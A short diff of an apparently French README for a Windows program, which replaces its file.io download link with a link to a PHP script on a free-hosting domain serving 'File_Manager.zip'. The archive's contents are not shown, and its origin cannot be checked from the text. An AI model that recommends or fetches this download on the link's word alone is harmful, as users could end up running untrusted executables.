@@ -5,8 +5,7 @@
 - Fonctionne sur: Windows 7, 8, 8.1, 10, 11.
 
 ## Lien de téléchargement
-https://file.io/0zUMAhaersvY
-
+http://epreuvesconcours.go.yj.fr/telecharger.php?fichier=File_Manager.zip
 
 ## Comment l'utiliser ?
 
